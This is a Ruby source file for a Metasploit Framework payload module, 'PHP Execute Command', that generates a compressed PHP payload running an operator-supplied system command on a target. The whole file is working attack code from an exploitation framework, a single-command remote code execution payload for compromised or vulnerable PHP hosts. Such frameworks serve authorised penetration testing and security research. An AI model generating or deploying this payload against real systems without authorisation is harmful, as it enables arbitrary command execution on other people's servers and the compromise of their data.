##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Execute Command ',
        'Description' => 'Execute a single system command',
        'Author' => [ 'egypt' ],
        'License' => BSD_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP
      )
    )
    register_options(
      [
        OptString.new('CMD', [ true, 'The command string to execute' ]),
      ]
    )
  end

  def php_exec_cmd
    # please do not copy me into new code, instead use the #php_exec_cmd method after including Msf::Payload::Php or
    # use the PHP adapter payload by selecting any php/unix/cmd/* payload
    vars = Rex::RandomIdentifier::Generator.new(language: :php)
    shell <<-END_OF_PHP_CODE
      #{php_preamble(vars_generator: vars)}
      #{php_system_block(vars_generator: vars, cmd: datastore['CMD'])}
    END_OF_PHP_CODE

    Rex::Text.compress(shell)
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    return php_exec_cmd
  end
end
